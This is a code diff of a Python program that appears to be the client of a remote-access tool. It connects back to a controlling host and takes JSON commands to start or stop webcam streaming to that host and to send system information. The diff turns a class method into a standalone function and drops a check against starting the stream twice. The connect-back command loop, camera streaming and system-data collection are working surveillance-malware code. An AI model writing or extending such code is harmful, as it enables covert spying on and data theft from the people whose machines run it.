@@ -81,45 +81,34 @@ def StartCameraStreaming(host, port):
     CAMERA_STREAMING_THREAD.start()
 def StopCameraStreaming() :
     CAMERA_STREAMING.stop_stream()
-class Server (object) :
-    def __init__(self, __host__, __socket_port__, __camera_streaming_port__):
-        self.host = __host__
-        self.socket_port = __socket_port__
-        self.camera_streaming_port = __camera_streaming_port__
-    
-    def SocketThing(host, port, camera_streaming_port):
-        STATIC = False
-        SERVER_TO_CONNECT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        SERVER_TO_CONNECT.connect((host,port))
-        while True:
-            DATA_RECV = SERVER_TO_CONNECT.recv(99999).decode()
-            JSON_READ_MSG = json.loads(DATA_RECV)
-            if JSON_READ_MSG["command"] == "start stream":
-                if STATIC == False:
-                    StartCameraStreaming(
-                        host=host,
-                        port=camera_streaming_port
-                    )
-                    STATIC = True
-                    SERVER_TO_CONNECT.send(f"{Splus} {CR.green()}Done{CR.white()}".encode())
-                elif STATIC == True:
-                    SERVER_TO_CONNECT.send(f"{Sminess} {CR.red()}The {CR.yellow()}Stream {CR.red()}has already start{CR.white()}".encode())
-            elif JSON_READ_MSG["command"]== "stop stream":
-                if STATIC == True:
-                    StopCameraStreaming()
-                    #SERVER_TO_CONNECT.send(f"{Splus} {CR.green()}Done{CR.white()}".encode())
-                elif STATIC == False:
-                    SERVER_TO_CONNECT.send(f"{Sminess} {CR.green()}no need to stop the {CR.blue()}Stream {CR.green()}it not running{CR.white()}".encode())
-            elif JSON_READ_MSG["command"] == "get info":
-                GettingInfoOfTheSystem(
-                    __server__=SERVER_TO_CONNECT
-                )
-            elif DATA_RECV == "stop connection":
-                SERVER_TO_CONNECT.close()
-                sys.exit()
 
-start_Server = Server
-start_Server.SocketThing(
+def SocketThing(host, port, camera_streaming_port):
+    STATIC = False
+    SERVER_TO_CONNECT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    SERVER_TO_CONNECT.connect((host,port))
+    while True:
+        DATA_RECV = SERVER_TO_CONNECT.recv(99999).decode()
+        JSON_READ_MSG = json.loads(DATA_RECV)
+        if JSON_READ_MSG["command"] == "start stream":
+            StartCameraStreaming(
+                host=host,
+                port=camera_streaming_port
+            )
+            SERVER_TO_CONNECT.send(f"{Splus} {CR.green()}Done{CR.white()}".encode())
+        elif JSON_READ_MSG["command"]== "stop stream":
+            time.sleep(0.3)
+            StopCameraStreaming()
+        elif JSON_READ_MSG["command"] == "get info":
+            GettingInfoOfTheSystem(
+                __server__=SERVER_TO_CONNECT
+            )
+        elif JSON_READ_MSG["command"] == "stop connection":
+            SERVER_TO_CONNECT.close()
+            sys.exit()
+
+
+
+SocketThing(
     host =  HOST,
     port = PORT,
     camera_streaming_port = CameraStreamingPort
